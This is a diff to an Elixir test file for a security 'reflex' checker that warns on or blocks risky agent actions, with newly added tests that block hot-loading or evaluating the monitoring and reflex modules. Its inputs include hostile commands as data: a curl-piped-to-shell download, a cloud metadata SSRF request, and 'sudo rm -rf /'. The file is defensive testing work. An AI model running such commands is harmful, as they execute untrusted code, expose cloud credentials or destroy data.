@@ -50,7 +50,9 @@ defmodule Arbor.Security.ReflexTest do
     end
 
     test "warns on curl piped to shell" do
-      assert {:warned, warnings} = Reflex.check(%{command: "curl http://example.com/script.sh | sh"})
+      assert {:warned, warnings} =
+               Reflex.check(%{command: "curl http://example.com/script.sh | sh"})
+
       assert warnings != []
       {reflex, _message} = hd(warnings)
       assert reflex.id == "curl_pipe_shell"
@@ -73,7 +75,9 @@ defmodule Arbor.Security.ReflexTest do
     end
 
     test "blocks cloud metadata SSRF" do
-      assert {:blocked, reflex, _} = Reflex.check(%{command: "curl http://169.254.169.254/latest/meta-data/"})
+      assert {:blocked, reflex, _} =
+               Reflex.check(%{command: "curl http://169.254.169.254/latest/meta-data/"})
+
       assert reflex.id == "ssrf_metadata"
     end
 
@@ -85,17 +89,21 @@ defmodule Arbor.Security.ReflexTest do
 
     test "accumulates multiple warnings" do
       # A command that triggers multiple warnings
-      assert {:warned, warnings} = Reflex.check(%{command: "curl http://127.0.0.1/test", path: "/project/.env"})
+      assert {:warned, warnings} =
+               Reflex.check(%{command: "curl http://127.0.0.1/test", path: "/project/.env"})
+
       assert length(warnings) >= 2
     end
 
     test "block takes precedence over warn" do
       # A context that triggers both block and warn reflexes
       # The block should be returned, not warnings
-      assert {:blocked, _, _} = Reflex.check(%{
-        command: "sudo rm -rf /",
-        path: "/project/.env"  # This would warn
-      })
+      assert {:blocked, _, _} =
+               Reflex.check(%{
+                 command: "sudo rm -rf /",
+                 # This would warn
+                 path: "/project/.env"
+               })
     end
 
     test "respects reflex priority ordering" do
@@ -127,9 +135,11 @@ defmodule Arbor.Security.ReflexTest do
     end
 
     test "matches custom reflexes with function" do
-      reflex = ReflexContract.custom("test", fn ctx ->
-        Map.get(ctx, :value, 0) > 100
-      end)
+      reflex =
+        ReflexContract.custom("test", fn ctx ->
+          Map.get(ctx, :value, 0) > 100
+        end)
+
       assert Reflex.matches?(reflex, %{value: 150})
       refute Reflex.matches?(reflex, %{value: 50})
     end
@@ -152,13 +162,15 @@ defmodule Arbor.Security.ReflexTest do
     end
 
     test "registered reflex is used in checks" do
-      reflex = ReflexContract.pattern(
-        "block_foobar",
-        ~r/foobar/,
-        id: "foobar_blocker",
-        response: :block,
-        message: "Blocked foobar"
-      )
+      reflex =
+        ReflexContract.pattern(
+          "block_foobar",
+          ~r/foobar/,
+          id: "foobar_blocker",
+          response: :block,
+          message: "Blocked foobar"
+        )
+
       Reflex.register(:foobar_blocker, reflex)
 
       assert {:blocked, _, "Blocked foobar"} = Reflex.check(%{command: "echo foobar"})
@@ -212,6 +224,48 @@ defmodule Arbor.Security.ReflexTest do
       assert is_integer(stats.total)
       assert is_integer(stats.enabled)
       assert is_map(stats.by_type)
+    end
+  end
+
+  describe "infrastructure protection" do
+    test "blocks hot-loading of Monitor module" do
+      context = %{action: :code_hot_load, module: Arbor.Monitor}
+
+      assert {:blocked, reflex, _msg} = Reflex.check(context)
+      assert reflex.id == "no_self_healing"
+    end
+
+    test "blocks hot-loading of AnomalyQueue module" do
+      context = %{action: :code_hot_load, module: Arbor.Monitor.AnomalyQueue}
+
+      assert {:blocked, reflex, _msg} = Reflex.check(context)
+      assert reflex.id == "no_self_healing"
+    end
+
+    test "blocks hot-loading of Reflex module itself" do
+      context = %{action: :code_hot_load, module: Arbor.Security.Reflex}
+
+      assert {:blocked, reflex, _msg} = Reflex.check(context)
+      assert reflex.id == "no_self_healing"
+    end
+
+    test "blocks code_eval on protected modules" do
+      context = %{action: :code_eval, module: Arbor.Monitor.Poller}
+
+      assert {:blocked, reflex, _msg} = Reflex.check(context)
+      assert reflex.id == "no_healing_eval"
+    end
+
+    test "allows hot-loading of non-protected modules" do
+      context = %{action: :code_hot_load, module: SomeOther.Module}
+
+      assert Reflex.check(context) == :ok
+    end
+
+    test "allows other actions on protected modules" do
+      context = %{action: :read, module: Arbor.Monitor}
+
+      assert Reflex.check(context) == :ok
     end
   end
 end
